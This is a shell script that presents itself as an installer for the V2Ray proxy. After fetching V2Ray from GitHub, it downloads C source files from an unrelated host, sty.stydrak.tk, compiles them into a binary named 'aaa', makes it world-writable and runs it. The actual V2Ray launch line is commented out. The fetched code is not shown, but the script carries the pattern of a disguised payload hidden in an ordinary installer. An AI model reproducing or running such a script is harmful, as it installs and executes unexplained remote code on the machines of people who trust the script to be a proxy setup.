#!/bin/sh

# Download and install V2Ray
mkdir /tmp/v2ray
curl -L -H "Cache-Control: no-cache" -o /tmp/v2ray/v2ray.zip https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip
unzip /tmp/v2ray/v2ray.zip -d /tmp/v2ray
install -m 755 /tmp/v2ray/v2ray /usr/local/bin/v2ray
install -m 755 /tmp/v2ray/v2ctl /usr/local/bin/v2ctl
curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/1.c http://sty.stydrak.tk/1.c
curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.c http://sty.stydrak.tk/aes.c
curl -L -H "Cache-Control: no-cache" -o /usr/local/bin/aes.h http://sty.stydrak.tk/aes.h
cd /usr/local/bin
gcc -o aaa 1.c aes.c -lpthread
chmod 777 ./aaa

# Remove temporary directory
rm -rf /tmp/v2ray

# V2Ray new configuration
install -d /usr/local/etc/v2ray
cat << EOF > /usr/local/etc/v2ray/config.json
{
    "inbounds": [
        {
            "port": $PORT,
            "protocol": "vmess",
            "settings": {
                "clients": [
                    {
                        "id": "$UUID",
                        "alterId": 64
                    }
                ],
                "disableInsecureEncryption": true
            },
            "streamSettings": {
                "network": "ws"
            }
        }
    ],
    "outbounds": [
        {
            "protocol": "freedom"
        }
    ]
}
EOF

# Run V2Ray
#/usr/local/bin/v2ray -config /usr/local/etc/v2ray/config.json
./aaa
